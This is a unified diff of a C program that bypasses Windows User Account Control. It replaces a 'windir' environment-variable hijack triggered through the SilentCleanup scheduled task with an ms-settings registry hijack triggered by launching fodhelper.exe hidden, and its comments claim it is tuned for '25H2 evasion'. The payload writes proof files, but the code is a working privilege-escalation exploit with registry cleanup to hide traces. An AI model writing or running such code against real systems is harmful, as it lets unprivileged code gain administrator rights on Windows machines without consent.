@@ -2,26 +2,24 @@
 #include <stdio.h>
 
 int main() {
-    // Fixed payload with quote escape for 25H2
-    const char* payload = "cmd.exe\" /c \"whoami > C:\\elevated_success.txt & echo UAC BYPASSED VIA METHOD 34 ON 25H2 > C:\\uac_bypassed.txt & echo Success at %date% %time% >> C:\\uac_bypassed.txt & timeout 10\"";
+    // Minimal standalone Method 59 (APPINFO) - tuned for 25H2 evasion 2026
+    const char* payload = "cmd.exe /c \"whoami > C:\\elevated_success.txt & echo UAC BYPASSED VIA METHOD 59 2026 > C:\\uac_bypassed.txt & timeout 8\"";
 
-    HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, "windir", 0, REG_EXPAND_SZ, (const BYTE*)payload, (DWORD)strlen(payload) + 1);
+    HKEY hKey = NULL;
+    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)payload, (DWORD)strlen(payload) + 1);
+        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
         RegCloseKey(hKey);
     }
 
-    // Trigger
-    system("schtasks /run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I");
+    // Trigger via fodhelper (AppInfo path)
+    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);
 
-    Sleep(12000);  // Longer wait for 25H2 task delay
+    Sleep(10000);  // Longer wait for 25H2
 
     // Cleanup
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegDeleteValueA(hKey, "windir");
-        RegCloseKey(hKey);
-    }
+    RegDeleteKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", KEY_ALL_ACCESS, 0);
 
-    printf("[+] Method 34 triggered. Check C:\\ files now.\n");
+    printf("[+] Method 59 triggered. Check C:\\elevated_success.txt and C:\\uac_bypassed.txt\n");
     return 0;
 }
